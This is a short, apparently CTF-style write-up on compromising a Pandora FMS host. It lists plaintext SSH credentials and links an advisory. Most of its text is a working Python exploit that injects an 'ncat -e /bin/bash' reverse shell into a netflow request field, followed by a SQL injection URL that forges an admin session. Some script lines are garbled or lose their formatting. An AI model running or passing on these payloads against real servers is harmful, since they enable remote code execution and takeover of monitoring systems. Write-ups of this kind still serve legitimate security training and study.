After enumeration we find credentials for `daniel` we can ssh in with these

daniel:HotelBabylon23

browsing to `/var/www/pandora/pandora_console/index.php` 
we see that it is running Pandora FMS 


https://blog.sonarsource.com/pandora-fms-742-critical-code-vulnerabilities-explained

---

### port forwarding

web gui is running on port 80, we must forward this to our host


```
!/usr/bin/python3

import requests

import sys

if len(sys.argv) != 6:

print("[+] Usage : ./rce.py target username password ip port")

exit()

target = sys.argv[1]

username = sys.argv[2]

password = sys.argv[3]

ip = sys.argv[4]

port = int(sys.argv[5])

request = requests.session()

login_info = {

"nick": username,

"pass": password,

"login_button": "Login"

}

login_request = request.post(

target+"/pandora_console/index.php?login=1",

login_info,

verify=False,

allow_redirects=True

)

resp = login_request.text

if "User not found in database" in resp:

print("[-] Login Failed")

exit()

else:

print("[+] Logged In Successfully")

print("[+] Sending crafted graph request ..")

body_request = {

"date": "0",

"time": "0",

"period": "0",

"interval_length": "0",

"chart_type": "netflow_area",

"max_aggregates": "1",

"address_resolution": "0",

"name": "0",

"assign_group": "0",

"filter_type": "0",

"filter_id": "0",

"filter_selected": "0",

"ip_dst": "0",

"ip_src": '";ncat -e /bin/bash {0} {1} #'.format(ip, port),

"draw_button": "Draw"

}

draw_url = target + "/pandora_console/index.php?sec=netf&sec2=operati=on/netflow/nf_live_view&pure=0"

request.post(draw_url, body_request)

print("[+] Check your netcat ;)")

# ################### END SCRIPT ######################## #

http://localhost/pandora_console/include/chart_generator.php?session_id=a%27%20UNION%20SELECT%20%27a%27,1,%27id_usuario|s:5:%22admin%22;%27%20as%20data%20FROM%20tsessions_php%20WHERE%20%271%27=%271

```


